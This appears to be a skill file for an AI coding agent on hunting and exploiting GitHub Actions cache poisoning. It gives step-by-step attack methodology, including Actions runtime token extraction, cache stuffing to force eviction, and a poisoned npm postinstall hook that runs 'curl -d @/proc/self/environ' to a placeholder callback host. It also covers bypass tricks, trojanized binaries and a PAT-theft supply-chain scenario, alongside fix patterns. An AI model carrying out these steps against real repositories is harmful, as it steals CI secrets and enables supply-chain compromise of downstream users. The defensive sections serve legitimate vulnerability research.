---
name: github-actions-cache-poisoning
description: >
  Use when hunting GitHub Actions cache poisoning vulnerabilities where an attacker
  can inject malicious content into the CI/CD cache and have it restored by a privileged
  downstream workflow. Trigger on: "cache poisoning", "actions/cache", "actions/setup-node",
  "node_modules cache", "GitHub Actions cache", "pnpm cache", "LRU eviction", "10GB limit",
  "Cacheract", "poisoned cache", "workflow cache attack", supply chain via CI cache,
  "ng-renovate", "cache stuffing", scheduled workflow cache restore, shared cache key,
  "hashFiles package.json", cross-workflow cache, PR workflow release workflow same key,
  "npm install prefer-offline", Cacheract, Gato-X, supply chain npm token.
license: MIT
compatibility: Designed for Claude Code. Requires read access to target repository's workflow files.
metadata:
  category: cicd
  version: "0.1"
  source: https://adnanthekhan.com/posts/angular-compromise-through-dev-infra/
  source_types: blog_post
---

# GitHub Actions Cache Poisoning

## What Is Broken and Why

GitHub Actions caches are shared across workflow runs within a repository. When a
privileged workflow (with access to secrets or write permissions) restores a cache
without verifying its integrity, an attacker who can write to the cache — even via a
low-privilege workflow — can plant malicious content that executes in the privileged
context. Since GitHub's November 2025 cache policy change, entries exceeding 10 GB
are evicted immediately (not via batch jobs), making it possible to force eviction of
legitimate cache entries and replace them with poisoned ones within a single workflow run.

## Key Signals

- **Shared cache key across PR and release workflows**: `key: ${{ runner.os }}-node-${{ hashFiles('**/package.json') }}` used identically in both a `pull_request`/`pull_request_target` workflow AND a release/publish workflow
- Repository uses `actions/cache`, `actions/setup-node`, `actions/setup-python` (or similar) with caching enabled
- A scheduled or bot-triggered workflow runs with elevated secrets and restores a shared cache
- Cache keys are predictable or controllable (e.g., based on `pnpm-lock.yaml` hash, OS, Node version)
- Attacker can trigger a workflow (e.g., via fork PR) that writes to the same cache namespace
- `pull_request` workflows share cache namespace with base branch workflows
- Package manager install step runs after cache restore without lockfile integrity check: `pnpm install --frozen-lockfile` (still executes postinstall scripts from restored cache)
- Large cache repositories (close to or exceeding 10 GB limit)

## Methodology

1. Map all workflows and identify privileged ones: scheduled runs, `workflow_run`, bot-triggered, those with `secrets.*` access.
2. Identify cache restore steps in privileged workflows — note cache keys and what is restored (node_modules, pip, gradle, etc.).
3. Identify a workflow the attacker can trigger (fork PR, `workflow_dispatch`) that writes to the same cache namespace.
4. Confirm the cache key overlap: attacker-controlled workflow must produce a cache entry that the privileged workflow will restore.
5. Gain code execution in attacker-controlled workflow (e.g., via script injection — see `github-actions-script-injection`).
6. From that execution context:
   a. Extract `ACTIONS_RUNTIME_TOKEN` from environment.
   b. Stuff the repository cache beyond 10 GB with junk data to force immediate LRU eviction of legitimate entries.
   c. Write poisoned cache entry (malicious `node_modules` with postinstall hook or patched binary).
7. Wait for privileged workflow to run and restore the poisoned cache.
8. Poisoned code executes — exfiltrate secrets or perform privileged actions.

## Payloads & Tools

```bash
# Step 1: Extract Actions Runtime Token (from compromised workflow environment)
echo $ACTIONS_RUNTIME_TOKEN
echo $ACTIONS_CACHE_URL

# Step 2: Stuff cache to trigger 10GB LRU eviction
# Use GitHub Actions cache API to upload large junk entries
python3 -c "
import requests, os, uuid
token = os.environ['ACTIONS_RUNTIME_TOKEN']
cache_url = os.environ['ACTIONS_CACHE_URL']
# Upload ~10GB of junk to evict legitimate entries
for i in range(100):
    key = f'junk-{uuid.uuid4()}'
    # POST to /_apis/artifactcache/caches
"

# Step 3: Create poisoned node_modules cache
# Add malicious postinstall script to a dependency
mkdir -p poisoned_node_modules/.bin
cat > poisoned_node_modules/evil-pkg/package.json <<'EOF'
{"name":"evil-pkg","scripts":{"postinstall":"curl -d @/proc/self/environ https://CALLBACK"}}
EOF
# Pack and upload as cache entry matching target workflow's cache key
```

```bash
# Identify cache key patterns from workflow YAML
grep -rn 'cache-dependency-path\|key:.*pnpm\|key:.*npm\|key:.*yarn' .github/workflows/

# Find workflows with privileged secrets + cache restore
grep -rn 'secrets\.' .github/workflows/ | grep -l 'setup-node\|actions/cache'
```

**Tool: Cacheract** — PoC automating Runtime Token extraction, cache stuffing, and poisoned entry upload. Not publicly released; replicate logic via GitHub Actions cache API (`/_apis/artifactcache/`).

## Bypass Techniques

- **Cache key prediction**: most cache keys are deterministic (OS + lockfile hash) — compute them without running the workflow
- **Restore key fallback**: GitHub Actions v2 treats all keys as restore keys; partial key matches are sufficient for restore — no need to match the full cache key
- **Eviction racing**: flood cache with many small entries rather than one large one to more reliably trigger eviction
- **Postinstall hooks**: malicious code in `postinstall`/`prepare` npm scripts executes during `npm install` / `pnpm install` even with `--frozen-lockfile` (lockfile only checks versions, not scripts)
- **Binary replacement**: replace a trusted binary (e.g., `node`, `pnpm`) in the cached `node_modules/.bin/` with a trojanized version
- **Workflow run ordering**: use `gh api` to monitor workflow run queue and time the cache poisoning to execute just before the privileged workflow

## Exploitation Scenarios

**Scenario 1 — Secrets exfiltration via poisoned node_modules**
Setup: Scheduled `ng-renovate`-style workflow runs nightly, restores `node_modules` cache, runs `pnpm install --frozen-lockfile`, then uses a secret token to push PRs.
Trigger: Attacker gains RCE in a low-priv fork PR workflow, uses Cacheract to evict and replace node_modules cache with a version containing malicious postinstall scripts.
Impact: When the scheduled workflow runs, postinstall executes the secret token to CALLBACK server. Attacker now has a privileged service account token.

**Scenario 2 — Cascading supply chain compromise**
Setup: Attacker exfiltrates `angular-robot`-style PAT with `repo` + `workflow` scopes from poisoned cache. Robot account has a "bot exception" — maintainers approve its PRs without re-review after force-push.
Trigger: Attacker waits for robot-created version bump PR to get approved, force-pushes the PR head to point to a backdoored action commit (optionally using `lucky-commit` to match the expected short SHA).
Impact: Backdoored action merges into main CI, executes in all subsequent CI runs, exfiltrates GitHub App private key → attacker can push directly to main branch.

**Scenario 3 — pip/gradle cache poisoning (non-Node)**
Setup: Python project's scheduled security scan restores `pip` cache and runs `pip install -r requirements.txt`.
Trigger: Attacker poisons cached wheel for a dependency with a malicious `setup.py` `install` hook.
Impact: Security scan workflow executes attacker code with whatever secrets are in scope.

## False Positives

- Cache is scoped to a branch and the privileged workflow only restores caches from protected branches (not fork PRs)
- `actions/cache` configured with `enableCrossOsArchive: false` and strict OS/arch matching that prevents attacker-controlled workflows from producing matching keys
- Cache keys include a secret-derived component unknown to the attacker
- Privileged workflow does a clean install ignoring cache (`npm ci --ignore-scripts` with no `actions/cache` restore)

## Fix Patterns

```yaml
# WRONG: restore cache then install (executes cached postinstall scripts)
- uses: actions/setup-node@v4
  with:
    cache: 'pnpm'
- run: pnpm install --frozen-lockfile

# BETTER: disable scripts for cached installs, or skip cache in privileged workflows
- run: pnpm install --frozen-lockfile --ignore-scripts

# BEST: don't cache node_modules in privileged/scheduled workflows at all
- uses: actions/setup-node@v4
  # no cache: field
- run: pnpm install --frozen-lockfile
```

- In privileged workflows, prefer `npm ci` / `pnpm install` without cache restore, or verify cache integrity via hash
- Scope cache keys to include a secret-derived salt — attacker cannot predict or match the key
- Use `--ignore-scripts` in CI installs and run lifecycle scripts explicitly and audited
- Restrict fork PR workflows from writing to the main cache namespace (GitHub's `GITHUB_REF` scoping helps but is not foolproof)
- Monitor cache entry creation via audit logs; alert on unexpected entries near the 10 GB limit

## Related Skills

Cache poisoning requires an initial foothold in a workflow context — that foothold typically comes from [[github-actions-script-injection]] (injecting into a `run:` step) or [[pwn-request]] (executing `preinstall` scripts from attacker-controlled `package.json`). [[self-hosted-runner-poisoning]] makes cache poisoning more impactful because persistent runners carry poisoned state between jobs without needing a new LRU eviction cycle. The underlying primitive — writing to a shared resource without integrity verification — mirrors supply-chain techniques in [[pwn-request]].
